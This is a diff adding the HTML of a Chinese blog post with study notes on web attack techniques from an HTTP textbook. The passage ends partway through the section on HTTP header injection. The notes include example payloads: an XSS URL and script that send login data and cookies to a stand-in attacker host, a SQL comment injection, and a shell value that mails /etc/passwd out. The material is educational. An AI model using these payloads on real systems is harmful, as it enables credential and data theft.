@@ -1,0 +1,1485 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="http," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="赖同学" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="不知不觉，已经到了这本书的最后一章了，这本书整体看下来，感觉挺通俗易懂的，就是其中一些标准有些过时，毕竟也是很久前的书籍。看完 http 相关的之后，后面的时间都拿来学习 nodeJs以及js数据结构算法相关的。在当当网开学季买的书，只开封了一本《枕边算法书》，《你不知道的javaScript》系列三本等待开封… 第十一章  Web 的攻击技术互联网上的攻击大都将 Web 站点作为目标。本章讲解具">
+<meta name="keywords" content="http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入浅出HTTP，从开始到放弃（第十一章）—— Web 的攻击技术">
+<meta property="og:url" content="http://laibh.top/2018-09-18-read-图解HTTP-Part11.html">
+<meta property="og:site_name" content="赖同学">
+<meta property="og:description" content="不知不觉，已经到了这本书的最后一章了，这本书整体看下来，感觉挺通俗易懂的，就是其中一些标准有些过时，毕竟也是很久前的书籍。看完 http 相关的之后，后面的时间都拿来学习 nodeJs以及js数据结构算法相关的。在当当网开学季买的书，只开封了一本《枕边算法书》，《你不知道的javaScript》系列三本等待开封… 第十一章  Web 的攻击技术互联网上的攻击大都将 Web 站点作为目标。本章讲解具">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-对%20Web%20应用的攻击.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-主动攻击.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-被动攻击.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-利用被动攻击对企业内网发动攻击.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-验证数据的几个地方.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-地址栏中%20URI.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-信息窃取.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-使用%20XSS%20攻击夺取%20Cookie%20信息.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-OS%20注入攻击的攻击案例.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-HTTP%20首部注入攻击示例.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-邮件首部注入攻击案例.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-会话劫持.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-会话固定攻击案例.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-跨站点请求伪造的攻击案例.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-穷举法·字典攻击进行类推.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-彩虹表.png">
+<meta property="og:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-DoS%20攻击.png">
+<meta property="og:updated_time" content="2022-03-04T10:00:38.456Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="深入浅出HTTP，从开始到放弃（第十一章）—— Web 的攻击技术">
+<meta name="twitter:description" content="不知不觉，已经到了这本书的最后一章了，这本书整体看下来，感觉挺通俗易懂的，就是其中一些标准有些过时，毕竟也是很久前的书籍。看完 http 相关的之后，后面的时间都拿来学习 nodeJs以及js数据结构算法相关的。在当当网开学季买的书，只开封了一本《枕边算法书》，《你不知道的javaScript》系列三本等待开封… 第十一章  Web 的攻击技术互联网上的攻击大都将 Web 站点作为目标。本章讲解具">
+<meta name="twitter:image" content="http://laibh.top/images/2018-09-18-read-图解HTTP-Part11-对%20Web%20应用的攻击.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '1YNH8Y3MP9',
+      apiKey: '61c189facf700193dfcbb902369ce227',
+      indexName: 'MyBlog',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"想要找些什么呢","hits_empty":"${query} 没有被找到，再试试","hits_stats":"在 ${time} ms 查找了${hits}个结果"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://laibh.top/2018-09-18-read-图解HTTP-Part11.html"/>
+
+
+
+
+
+  <title>深入浅出HTTP，从开始到放弃（第十一章）—— Web 的攻击技术 | 赖同学</title>
+  
+
+
+
+
+
+
+
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">赖同学</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guestbook">
+          <a href="/guestbook" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comment"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://laibh.top/2018-09-18-read-图解HTTP-Part11.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="赖彬鸿">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/myPhoto.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="赖同学">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">深入浅出HTTP，从开始到放弃（第十一章）—— Web 的攻击技术</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-18T11:50:54+08:00">
+                2018-09-18
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2022-03-04T18:00:38+08:00">
+                2022-03-04
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/http/" itemprop="url" rel="index">
+                    <span itemprop="name">http</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018-09-18-read-图解HTTP-Part11.html" class="leancloud_visitors" data-flag-title="深入浅出HTTP，从开始到放弃（第十一章）—— Web 的攻击技术">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  7,820
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>不知不觉，已经到了这本书的最后一章了，这本书整体看下来，感觉挺通俗易懂的，就是其中一些标准有些过时，毕竟也是很久前的书籍。看完 http 相关的之后，后面的时间都拿来学习 nodeJs以及js数据结构算法相关的。在当当网开学季买的书，只开封了一本《枕边算法书》，《你不知道的javaScript》系列三本等待开封…</p>
+<h2 id="第十一章-Web-的攻击技术"><a href="#第十一章-Web-的攻击技术" class="headerlink" title="第十一章  Web 的攻击技术"></a>第十一章  Web 的攻击技术</h2><p>互联网上的攻击大都将 Web 站点作为目标。本章讲解具体有哪些攻击 Web 站点的手段，以及攻击会造成怎样的影响。</p>
+<h3 id="针对-Web-的攻击技术"><a href="#针对-Web-的攻击技术" class="headerlink" title="针对 Web 的攻击技术"></a>针对 Web 的攻击技术</h3><p>简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服务器上的 Web 应用等资源才是攻击目标。</p>
+<h4 id="HTTP-不具备必要的安全功能"><a href="#HTTP-不具备必要的安全功能" class="headerlink" title="HTTP 不具备必要的安全功能"></a>HTTP 不具备必要的安全功能</h4><p>现今的 Web 网站应用的 HTTP 协议的使用方式已发生了翻天覆地的变化。几乎现今所有的 Web 网站都会使用会话（session）管理、加密处理等安全性方面的功能，而 HTTP 协议内并不具备这些功能。从整体上看，HTTP 就是一个通用的单纯协议机制。因此它具备较多优势，但是在安全性方面则呈劣势。</p>
+<p>就拿远程登录时会用到的 SSH 协议来说，SSH 具备协议级别的认证及会话管理等功能，HTTP 协议则没有。另外在架设 SSH 服务方面，任何人都可以轻易地创建安全等级高的服务，而 HTTP 即使已架设好服务器，但若想提供服务器基础上的 Web 应用，很多情况下都需要重新开发。</p>
+<p>因此，开发者需要自行设计并开发认证及会话管理功能来满足 Web应用的安全。而自行设计就意味着会出现各种形形色色的实现。结果，安全等级并不完备，可仍在运作的 Web 应用背后却隐藏着各种容易被攻击者滥用的安全漏洞的 Bug。</p>
+<h4 id="在客户端即可篡改请求"><a href="#在客户端即可篡改请求" class="headerlink" title="在客户端即可篡改请求"></a>在客户端即可篡改请求</h4><p>在 Web 应用中，从浏览器那接收到的 HTTP 请求的全部内容，都可以在客户端自由地变更、篡改。所以 Web 应用可能会接收到与预期数据不相同的内容。</p>
+<p>在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击。通过 URL 查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传入，若这时 Web 应用存在安全漏洞，那内部信息就会遭到窃取，或被攻击者拿到管理权限。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-对 Web 应用的攻击.png" alt="对 Web 应用的攻击"></p>
+<h4 id="针对-Web-应用的攻击模式"><a href="#针对-Web-应用的攻击模式" class="headerlink" title="针对 Web 应用的攻击模式"></a>针对 Web 应用的攻击模式</h4><p>对 Web 应用的攻击模式有以下两种。</p>
+<ul>
+<li><p>以服务器为目标的主动攻击</p>
+<p>主动攻击（active attack）是指攻击者通过直接访问 Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。主动攻击模式里具有代表性的攻击是 SQL 注入攻击和 OS 命令注入攻击。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-主动攻击.png" alt="主动攻击"></p>
+</li>
+<li><p>以服务器为目标的被动攻击</p>
+<p>被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。</p>
+<p>被动攻击通常的攻击模式如下所示。</p>
+<p>步骤 1： 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。</p>
+<p>步骤 2： 当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。</p>
+<p>步骤 3： 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。</p>
+<p>步骤 4： 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。</p>
+<p>被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-被动攻击.png" alt="被动攻击"></p>
+</li>
+</ul>
+<p>另外还有利用用户的身份攻击企业内部网络</p>
+<p>利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。只要用户踏入攻击者预先设好的陷阱，在用户能够访问到的网络范围内，即使是企业内网也同样会受到攻击。</p>
+<p>很多企业内网依然可以连接到互联网上，访问 Web 网站，或接收互联网发来的邮件。这样就可能给攻击者以可乘之机，诱导用户触发陷阱后对企业内网发动攻击。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-利用被动攻击对企业内网发动攻击.png" alt="利用被动攻击对企业内网发动攻击"></p>
+<h3 id="因输出值转义不完全引发的安全漏洞"><a href="#因输出值转义不完全引发的安全漏洞" class="headerlink" title="因输出值转义不完全引发的安全漏洞"></a>因输出值转义不完全引发的安全漏洞</h3><p>实施 Web 应用的安全对策可大致分为以下两部分。</p>
+<ul>
+<li>客户端的验证</li>
+<li>Web 应用端（服务器端）的验证<ul>
+<li>输入值验证</li>
+<li>输出值转义</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-验证数据的几个地方.png" alt="验证数据的几个地方"></p>
+<p>多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高 UI体验的作用。</p>
+<p>Web 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。</p>
+<p>从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p>
+<h4 id="跨站脚本攻击"><a href="#跨站脚本攻击" class="headerlink" title="跨站脚本攻击"></a>跨站脚本攻击</h4><p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。动态创建的 HTML 部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。</p>
+<p>跨站脚本攻击有可能造成以下影响。</p>
+<ul>
+<li>利用虚假输入表单骗取用户个人信息。</li>
+<li>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li>
+<li>显示伪造的文章或图片。</li>
+</ul>
+<p>XSS 是攻击者利用预先设置的陷阱触发的被动攻击。</p>
+<p>跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。</p>
+<p>下图网站通过地址栏中 URI 的查询字段指定 ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-地址栏中 URI.png" alt="URI"></p>
+<p>充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页面内，诱使用户去点击该 URL。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//example.jp/login?ID=&gt;&lt;script&gt;var f=document.getElementById(login); f.action=http://hackr.jp/pwget; f.method=get;&lt;/script&gt;&lt;span s=</span></span><br></pre></td></tr></table></figure>
+<p>浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入 ID 和密码之后，就会直接发送到攻击者的网站（也就是 hackr.jp），导致个人登录信息被窃取。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-信息窃取.png" alt="信息窃取"></p>
+<p>之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。</p>
+<p>对用户 Cookie 的窃取攻击</p>
+<p>除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的 Cookie 信息。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http:<span class="comment">//hackr.jp/xss.js&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该脚本内指定的 <a href="http://hackr.jp/xss.js">http://hackr.jp/xss.js</a> 文件。即下面这段采用 JavaScript 编写的代码。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> content = <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;img src=http://hackr.jp/?"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(content);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&gt;"</span>);</span><br></pre></td></tr></table></figure>
+<p>在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信息。然 后这些信息会发送至攻击者的 Web 网站（<a href="http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的">http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的</a> Cookie 信息了。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-使用 XSS 攻击夺取 Cookie 信息.png" alt="使用 XSS 攻击夺取 Cookie 信息"></p>
+<h4 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h4><p>会执行非法 SQL 的 SQL 注入攻击</p>
+<p>SQL 注入（SQL Injection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL 而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。</p>
+<p>Web 应用通常都会用到数据库，当需要对数据库表内的数据进行检索或添加、删除等操作时，会使用 SQL 语句连接数据库进行特定的操作。如果在调用 SQL 语句的方式上存在疏漏，就有可能执行被恶意注入（Injection）非法 SQL 语句。</p>
+<p>SQL 注入攻击有可能会造成以下等影响。</p>
+<ul>
+<li>非法查看或篡改数据库内的数据</li>
+<li>规避认证</li>
+<li>执行和数据库服务器业务关联的程序等</li>
+</ul>
+<p>何为 SQL</p>
+<p>SQL 是用来操作关系型数据库管理系统（Relational DataBaseManagement System，RDBMS）的数据库语言，可进行操作数据或定义数据等。RDBMS 中有名的数据库有 Oracle Database、Microsoft SQL Server、IBM DB2、MySQL 和 PostgreSQL 等。这些数据库系统都可以把 SQL 作为数据库语言使用。使用数据库的 Web 应用，通过某种方法将 SQL 语句传给RDBMS，再把 RDBMS 返回的结果灵活地使用在 Web 应用中。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title,<span class="built_in">text</span> <span class="keyword">FROM</span> newsTbl <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p>SQL 注入攻击案例</p>
+<p>URL 的查询字段已指定 q= 上野宣，这个值由 Web 应用传入到SQL 语句中，构成下方的 SQL 语句。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> bookTbl <span class="keyword">WHERE</span> author = <span class="string">'上野宣'</span> <span class="keyword">and</span> flag = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p>该 SQL 语句表示“从 bookTbl 表中，显示满足 author= 上野宣 and flag=1（可售）所在行的数据”。数据库内的 bookTbl 表记录着该购物网站的所有书籍信息。通过SQL 语句，将满足作者名（author）上野宣并且 flag 为 1 双重条件的条目取出，最后作为搜索结果显示出来</p>
+<p>如果把上野宣改写成“上野宣’–”。</p>
+<p>构成的 SQL 语句就变成“从数据库的 bookTbl 表中，显示满足author= 上野宣条件所在行的数据”，如下所示。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> bookTbl <span class="keyword">WHERE</span> author =<span class="string">'上野宣'</span> - -<span class="string">' and flag=1;</span></span><br></pre></td></tr></table></figure>
+<p>SQL 语句中的 – 之后全视为注释。即，and flag=1 这个条件被自动忽略了。</p>
+<p>结果跟 flag 的设定值无关，只取出满足 author=“上野宣”条件所在行的数据，这样连那些尚未出版的书籍也一并显示出来了。</p>
+<p>本案例中的问题仅仅是把未出版书籍的条目也一同显示出来了。但实际发生 SQL 注入攻击时，很有可能会导致用户信息或结算内容等其他数据表的非法浏览及篡改，从而使用户遭受不同程度的损失。</p>
+<h4 id="OS-命令注入攻击"><a href="#OS-命令注入攻击" class="headerlink" title="OS 命令注入攻击"></a>OS 命令注入攻击</h4><p>OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。</p>
+<p>可以从 Web 应用中通过 Shell 来调用操作系统命令。倘若调用 Shell时存在疏漏，就可以执行插入的非法 OS 命令。</p>
+<p>OS 命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序。也就是说，通过 OS 注入攻击可执行 OS 上安装着的各种程序。</p>
+<p>OS 注入攻击案例</p>
+<p>下面以咨询表单的发送功能为例，讲解 OS 注入攻击。该功能可将用户的咨询邮件按已填写的对方邮箱地址发送过去。</p>
+<p><img src="/images/2018-09-18-read-图解HTTP-Part11-OS 注入攻击的攻击案例.png" alt="OS 注入攻击的攻击案例"></p>
+<p>下面摘选处理该表单内容的一部分核心代码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr = $q-&gt;param('mailaddress');</span><br><span class="line">open(MAIL, "| /usr/sbin/sendmail $adr");</span><br><span class="line">print MAIL "From: info@example.com\n";</span><br></pre></td></tr></table></figure>
+<p>程序中的 open 函数会调用 sendmail 命令发送邮件，而指定的邮件发送地址即 $adr 的值。<br>攻击者将下面的值指定作为邮件地址。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
+<p>程序接收该值，构成以下的命令组合。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
+<p>攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。</p>
+<p>可见，sendmail 命令执行被分隔后，接下去就会执行 cat/etc/passwd | mail <a href="mailto:hack@example.jp">hack@example.jp</a> 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 <a href="mailto:hack@example.jp">hack@example.jp</a>。</p>
+<h4 id="HTTP-首部注入攻击"><a href="#HTTP-首部注入攻击" class="headerlink" title="HTTP 首部注入攻击"></a>HTTP 首部注入攻击</h4><p>HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。</p>
+<p>向首部主体内添加内容的攻击称为 HTTP 响应截断攻击（HTTP Response Splitting Attack）。</p>
+<p>如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Location</span>: http://www.example.com/a.cgi?q=12345</span><br><span class="line"><span class="attribute">Set-Cookie</span>: UID=12345</span><br><span class="line">＊12345就是插入值</span><br></pre></td></tr></table></figure>
+<p>HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击。</p>
+<p>HTTP 首部注入攻击有可能会造成以下一些影响。</p>
+<ul>
+<li>设置任何 Cookie 信息</li>
+<li>重定向至任意 URL</li>
+<li>显示任意的主体（HTTP 响应截断攻击）</li>
+</ul>
+<p>HTTP 首部注入攻击案例</p>
+<p>下面我们以选定某个类别后即可跳转至各类别对应页面的功能为例，讲解 HTTP 首部注入攻击。该功能为每个类别都设定了一个类别 ID 值，一旦选定某类别，就会将该 ID 值反映在响应内的Location 首部字段内，形如 Location: <a href="http://example.com/?cat=101。令浏览器发生重定向跳转。">http://example.com/?cat=101。令浏览器发生重定向跳转。</a></p>
